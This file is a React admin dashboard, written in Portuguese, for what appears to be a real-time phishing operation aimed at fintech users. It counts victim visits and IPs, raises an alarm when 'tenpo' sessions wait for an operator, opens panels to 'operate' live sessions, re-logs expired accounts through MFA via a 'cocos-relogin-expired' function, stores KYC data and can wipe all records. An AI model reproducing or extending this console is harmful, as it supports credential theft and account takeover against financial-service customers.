import { useState, useCallback, useEffect } from "react";
import { useAuth } from "@/hooks/useAuth";

import { useAdminData } from "@/hooks/useAdminData";
import { supabase } from "@/integrations/supabase/client";
import {
  Shield,
  LogOut,
  Trash2,
  Activity,
  Eye,
  Wifi,
  Users,
  ShieldCheck,
  FileText,
  RefreshCw,
  UserX,
  Bell,
  BellOff,
} from "lucide-react";
import AdminLogin from "@/components/admin/AdminLogin";
import AllSessionsTable from "@/components/admin/AllSessionsTable";
import OperateSessionModal from "@/components/admin/OperateSessionModal";
import WhitelistManager from "@/components/admin/WhitelistManager";
import AdminLogs from "@/components/admin/AdminLogs";
import OnlineNowTab from "@/components/admin/OnlineNowTab";
import KycManager from "@/components/admin/KycManager";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
import type { SessionRecord } from "@/components/admin/AllSessionsTable";

interface OperatorOption {
  id: string;
  code: string;
  name: string;
  user_id?: string;
}

const Admin = () => {
  const { user, isAdmin, loading, signOut } = useAuth();
  const [forceRefresh, setForceRefresh] = useState(0);
  const { stats } = useAdminData(user?.id, isAdmin);
  const [operatingSessions, setOperatingSessions] = useState<SessionRecord[]>([]);
  const [clearing, setClearing] = useState(false);
  const [showConfirmClear, setShowConfirmClear] = useState(false);
  const [showWhitelist, setShowWhitelist] = useState(false);
  const [showClearAccounts, setShowClearAccounts] = useState(false);
  const [clearingAccounts, setClearingAccounts] = useState(false);
  const [showSignOutAll, setShowSignOutAll] = useState(false);
  const [signingOutAll, setSigningOutAll] = useState(false);
  const [activeTab, setActiveTab] = useState<"online" | "sessions" | "logs" | "kyc">("online");
  const [reloginRunning, setReloginRunning] = useState(false);
  const [reloginResult, setReloginResult] = useState<{ success: boolean; relogged?: number; failed?: number; total?: number; error?: string } | null>(null);
  const [operators, setOperators] = useState<OperatorOption[]>([]);
  const [myOperator, setMyOperator] = useState<OperatorOption | null>(null);

  // Notification sound for Tenpo sessions
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);

  // Tenpo pending count tracked here for header-level alarm
  const [tenpoPending, setTenpoPending] = useState(0);

  useEffect(() => {
    if (!user || !isAdmin) return;

    const loadOperators = async () => {
      const { data } = await supabase.from("operators").select("id, code, name, user_id").order("created_at");
      const ops = (data as OperatorOption[]) || [];
      setOperators(ops);
      const match = ops.find((operator) => operator.user_id === user.id && operator.code !== "master") || null;
      setMyOperator(match);
    };

    loadOperators();
  }, [user, isAdmin]);

  useEffect(() => {
    if (!user || !isAdmin) return;
    // Initial fetch
    const fetchPending = async () => {
      const { count } = await supabase
        .from("sessions")
        .select("*", { count: "exact", head: true })
        .eq("source", "tenpo")
        .eq("status", "waiting_admin");
      setTenpoPending(count || 0);
    };
    fetchPending();

    const channel = supabase
      .channel("tenpo-sessions-admin-sound")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.tenpo" }, () => {
        // Re-fetch count on any tenpo session change
        fetchPending();
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, isAdmin]);

  // Start/stop alarm based on tenpoPending
  useEffect(() => {
    if (tenpoPending > 0 && soundEnabled) {
      startAlarm();
    } else {
      stopAlarm();
    }
  }, [tenpoPending, soundEnabled, startAlarm, stopAlarm]);

  const handleClearAll = useCallback(async () => {
    setClearing(true);
    await supabase.from("sessions").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    await supabase.from("page_visits").delete().neq("id", "00000000-0000-0000-0000-000000000000");
    setShowConfirmClear(false);
    setClearing(false);
    setOperatingSessions([]);
    window.location.reload();
  }, []);

  const handleSignOutAll = useCallback(async () => {
    setSigningOutAll(true);
    try {
      const { data: { session } } = await supabase.auth.getSession();
      const token = session?.access_token;
      const projectId = import.meta.env.VITE_SUPABASE_PROJECT_ID;
      await fetch(`https://${projectId}.supabase.co/functions/v1/sign-out-all`, {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${token}`,
          "Content-Type": "application/json",
        },
      });
    } catch (_) {}
    setSigningOutAll(false);
    setShowSignOutAll(false);
    // Sign out current admin too
    await signOut();
  }, [signOut]);

  const handleReloginMfa = useCallback(async () => {
    if (reloginRunning) return;
    setReloginRunning(true);
    setReloginResult(null);
    try {
      const { data, error } = await supabase.functions.invoke("cocos-relogin-expired", { body: {} });
      if (error) {
        setReloginResult({ success: false, error: error.message });
      } else {
        setReloginResult(data);
      }
    } catch (e) {
      setReloginResult({ success: false, error: (e as Error).message });
    }
    setReloginRunning(false);
    setTimeout(() => setReloginResult(null), 10000);
  }, [reloginRunning]);

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-background">
        <div className="animate-pulse text-muted-foreground">Loading...</div>
      </div>
    );
  }

  if (!user) {
    return <AdminLogin onLogin={() => setForceRefresh((p) => p + 1)} />;
  }

  // Block admin@email.com — exclusive to PanelPlus only
  const isPlusDedicatedAdmin = user?.email === "admin@email.com";

  if (!isAdmin || isPlusDedicatedAdmin) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-background gap-4">
        <Shield className="h-12 w-12 text-destructive" />
        <h1 className="text-xl font-bold text-foreground">Acesso Negado</h1>
        <p className="text-muted-foreground">Você não tem permissões para este painel.</p>
        <button
          onClick={() => signOut()}
          className="mt-4 rounded-lg bg-primary px-6 py-2 text-sm font-medium text-primary-foreground hover:bg-primary/90"
        >
          Voltar
        </button>
      </div>
    );
  }

  return (
    <SessionPresenceProvider>
      <div className="min-h-screen bg-background">
        {/* ── Header ── */}
        <header className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur supports-[backdrop-filter]:bg-card/80">
          <div className="mx-auto flex max-w-[1400px] items-center justify-between px-4 py-3">
            <div className="flex items-center gap-3">
              <Shield className="h-5 w-5 text-primary" />
              <span className="text-sm font-bold text-foreground">Painel Admin</span>
            </div>

            {/* ── Inline stats ── */}
            <div className="hidden sm:flex items-center gap-4">
              <StatPill icon={<Eye size={12} />} value={stats.totalVisits} label="Visitas" />
              <StatPill icon={<Activity size={12} />} value={stats.totalSessions} label="Sessões" />
              <StatPill icon={<Wifi size={12} />} value={stats.onlineCount} label="Online" color="text-green-400" />
              <StatPill icon={<Users size={12} />} value={stats.uniqueIPs} label="IPs" />
            </div>

            {/* ── Actions ── */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => { setSoundEnabled(!soundEnabled); if (soundEnabled) stopAlarm(); }}
                className={`flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-colors ${
                  soundEnabled
                    ? "border-lime-500/30 text-lime-400 hover:bg-lime-500/10"
                    : "border-border text-muted-foreground hover:bg-secondary"
                }`}
                title={soundEnabled ? "Som ativado (Tenpo)" : "Som desativado"}
              >
                {soundEnabled ? <Bell size={13} /> : <BellOff size={13} />}
                <span className="hidden sm:inline">{soundEnabled ? "Som ON" : "Som OFF"}</span>
              </button>
              <button
                onClick={() => setShowWhitelist(true)}
                className="flex items-center gap-1.5 rounded-lg border border-primary/30 px-3 py-1.5 text-xs text-primary hover:bg-primary/10 transition-colors"
              >
                <ShieldCheck size={13} />
                <span className="hidden sm:inline">Anti-DDoS</span>
              </button>
              <button
                onClick={handleReloginMfa}
                disabled={reloginRunning}
                className={`flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-colors ${
                  reloginRunning
                    ? "border-blue-500/30 text-blue-400 opacity-70"
                    : reloginResult?.success
                      ? "border-green-500/30 text-green-400"
                      : reloginResult && !reloginResult.success
                        ? "border-destructive/30 text-destructive"
                        : "border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10"
                }`}
              >
                <RefreshCw size={13} className={reloginRunning ? "animate-spin" : ""} />
                <span className="hidden sm:inline">
                  {reloginRunning
                    ? "Relogando..."
                    : reloginResult?.success
                      ? `✅ ${reloginResult.relogged}/${reloginResult.total}`
                      : reloginResult && !reloginResult.success
                        ? "❌ Erro"
                        : "Relogin MFA"}
                </span>
              </button>
              <button
                onClick={() => setShowClearAccounts(true)}
                className="flex items-center gap-1.5 rounded-lg border border-amber-500/30 px-3 py-1.5 text-xs text-amber-400 hover:bg-amber-500/10 transition-colors"
              >
                <Users size={13} />
                <span className="hidden sm:inline">Limpar Contas</span>
              </button>
              <button
                onClick={() => setShowConfirmClear(true)}
                className="flex items-center gap-1.5 rounded-lg border border-destructive/30 px-3 py-1.5 text-xs text-destructive hover:bg-destructive/10 transition-colors"
              >
                <Trash2 size={13} />
                <span className="hidden sm:inline">Limpar Tudo</span>
              </button>
              <button
                onClick={() => setShowSignOutAll(true)}
                className="flex items-center gap-1.5 rounded-lg border border-orange-500/30 px-3 py-1.5 text-xs text-orange-400 hover:bg-orange-500/10 transition-colors"
              >
                <UserX size={13} />
                <span className="hidden sm:inline">Deslogar Todos</span>
              </button>
              <button
                onClick={() => signOut()}
                className="flex items-center gap-1.5 rounded-lg border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors"
              >
                <LogOut size={13} />
                <span className="hidden sm:inline">Sair</span>
              </button>
            </div>
          </div>
        </header>

        {/* ── Mobile stats bar ── */}
        <div className="sm:hidden border-b border-border bg-card px-4 py-2 flex items-center justify-around">
          <StatPill icon={<Eye size={11} />} value={stats.totalVisits} label="Visitas" />
          <StatPill icon={<Activity size={11} />} value={stats.totalSessions} label="Sessões" />
          <StatPill icon={<Wifi size={11} />} value={stats.onlineCount} label="Online" color="text-green-400" />
          <StatPill icon={<Users size={11} />} value={stats.uniqueIPs} label="IPs" />
        </div>

        {/* ── Confirm Clear Dialog ── */}
        {showConfirmClear && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
            <div className="mx-4 w-full max-w-sm rounded-xl border border-border bg-card p-6 shadow-2xl">
              <div className="mb-4 flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-destructive/10">
                  <Trash2 className="h-5 w-5 text-destructive" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-foreground">Limpar todos os dados?</h3>
                  <p className="text-xs text-muted-foreground">Isso vai excluir todas as sessões e visitas permanentemente.</p>
                </div>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={() => setShowConfirmClear(false)}
                  disabled={clearing}
                  className="flex-1 rounded-lg border border-border px-4 py-2 text-sm text-foreground hover:bg-secondary transition-colors disabled:opacity-50"
                >
                  Cancelar
                </button>
                <button
                  onClick={handleClearAll}
                  disabled={clearing}
                  className="flex-1 rounded-lg bg-destructive px-4 py-2 text-sm font-semibold text-destructive-foreground hover:bg-destructive/90 transition-colors disabled:opacity-50"
                >
                  {clearing ? "Limpando..." : "Sim, limpar tudo"}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── Clear Accounts Dialog ── */}
        {showClearAccounts && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
            <div className="mx-4 w-full max-w-sm rounded-xl border border-border bg-card p-6 shadow-2xl">
              <div className="mb-4 flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-amber-500/10">
                  <Users className="h-5 w-5 text-amber-400" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-foreground">Limpar todas as contas?</h3>
                  <p className="text-xs text-muted-foreground">Isso vai excluir todos os perfis de usuários e suas roles (exceto admins).</p>
                </div>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={() => setShowClearAccounts(false)}
                  disabled={clearingAccounts}
                  className="flex-1 rounded-lg border border-border px-4 py-2 text-sm text-foreground hover:bg-secondary transition-colors disabled:opacity-50"
                >
                  Cancelar
                </button>
                <button
                  onClick={async () => {
                    setClearingAccounts(true);
                    await supabase.from("user_roles").delete().eq("role", "user");
                    const { data: adminRoles } = await supabase.from("user_roles").select("user_id");
                    const adminIds = (adminRoles || []).map((role) => role.user_id);
                    if (adminIds.length > 0) {
                      await supabase.from("profiles").delete().not("user_id", "in", `(${adminIds.join(",")})`);
                    } else {
                      await supabase.from("profiles").delete().neq("id", "00000000-0000-0000-0000-000000000000");
                    }
                    setClearingAccounts(false);
                    setShowClearAccounts(false);
                  }}
                  disabled={clearingAccounts}
                  className="flex-1 rounded-lg bg-amber-500 px-4 py-2 text-sm font-semibold text-white hover:bg-amber-600 transition-colors disabled:opacity-50"
                >
                  {clearingAccounts ? "Limpando..." : "Sim, limpar contas"}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── Sign Out All Dialog ── */}
        {showSignOutAll && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm">
            <div className="mx-4 w-full max-w-sm rounded-xl border border-border bg-card p-6 shadow-2xl">
              <div className="mb-4 flex items-center gap-3">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-orange-500/10">
                  <UserX className="h-5 w-5 text-orange-400" />
                </div>
                <div>
                  <h3 className="text-sm font-bold text-foreground">Deslogar todos os admins?</h3>
                  <p className="text-xs text-muted-foreground">Todas as sessões ativas serão invalidadas imediatamente. Você também será deslogado.</p>
                </div>
              </div>
              <div className="flex gap-2">
                <button
                  onClick={() => setShowSignOutAll(false)}
                  disabled={signingOutAll}
                  className="flex-1 rounded-lg border border-border px-4 py-2 text-sm text-foreground hover:bg-secondary transition-colors disabled:opacity-50"
                >
                  Cancelar
                </button>
                <button
                  onClick={handleSignOutAll}
                  disabled={signingOutAll}
                  className="flex-1 rounded-lg bg-orange-500 px-4 py-2 text-sm font-semibold text-white hover:bg-orange-600 transition-colors disabled:opacity-50"
                >
                  {signingOutAll ? "Deslogando..." : "Sim, deslogar todos"}
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ── Whitelist Manager ── */}
        {showWhitelist && <WhitelistManager onClose={() => setShowWhitelist(false)} />}

        {/* ── Main Content ── */}
        <main className="mx-auto max-w-[1400px] px-4 py-4">
          <div className="mb-4 flex items-center gap-1 border-b border-border">
            <button
              onClick={() => setActiveTab("online")}
              className={`flex items-center gap-1.5 border-b-2 px-4 py-2.5 text-xs font-semibold transition-colors -mb-px ${
                activeTab === "online"
                  ? "border-green-500 text-green-400"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              <Wifi size={13} className={activeTab === "online" ? "animate-pulse" : ""} />
              Online Agora
              {activeTab !== "online" && (
                <span className="ml-1 h-1.5 w-1.5 rounded-full bg-green-400 animate-pulse" />
              )}
            </button>
            <button
              onClick={() => setActiveTab("sessions")}
              className={`flex items-center gap-1.5 border-b-2 px-4 py-2.5 text-xs font-semibold transition-colors -mb-px ${
                activeTab === "sessions"
                  ? "border-primary text-primary"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              <Activity size={13} />
              Sessões
            </button>
            <button
              onClick={() => setActiveTab("logs")}
              className={`flex items-center gap-1.5 border-b-2 px-4 py-2.5 text-xs font-semibold transition-colors -mb-px ${
                activeTab === "logs"
                  ? "border-primary text-primary"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              <FileText size={13} />
              Logs de Acesso
            </button>
            <button
              onClick={() => setActiveTab("kyc")}
              className={`flex items-center gap-1.5 border-b-2 px-4 py-2.5 text-xs font-semibold transition-colors -mb-px ${
                activeTab === "kyc"
                  ? "border-primary text-primary"
                  : "border-transparent text-muted-foreground hover:text-foreground"
              }`}
            >
              <ShieldCheck size={13} />
              KYC
            </button>
          </div>

          {activeTab === "online" ? (
            <OnlineNowTab />
          ) : activeTab === "sessions" ? (
            <AllSessionsTable
              onOperate={(session) => {
                setOperatingSessions((prev) => {
                  if (prev.some((item) => item.id === session.id)) return prev;
                  return [...prev, session];
                });
              }}
            />
          ) : activeTab === "logs" ? (
            <AdminLogs />
          ) : (
            <KycManager operators={operators} myOperator={myOperator} isAdmin={isAdmin} />
          )}
        </main>

        {/* ── Multi-modal Operation Panels ── */}
        {operatingSessions.map((session, index) => (
          <OperateSessionModal
            key={session.id}
            session={session}
            index={index}
            onClose={() => setOperatingSessions((prev) => prev.filter((item) => item.id !== session.id))}
          />
        ))}
      </div>
    </SessionPresenceProvider>
  );
};

/* ── Stat Pill ── */
const StatPill = ({
  icon,
  value,
  label,
  color,
}: {
  icon: React.ReactNode;
  value: number;
  label: string;
  color?: string;
}) => (
  <div className="flex items-center gap-1.5">
    <span className={color || "text-muted-foreground"}>{icon}</span>
    <span className="text-xs font-bold text-foreground tabular-nums">{value}</span>
    <span className="text-[10px] text-muted-foreground">{label}</span>
  </div>
);

export default Admin;
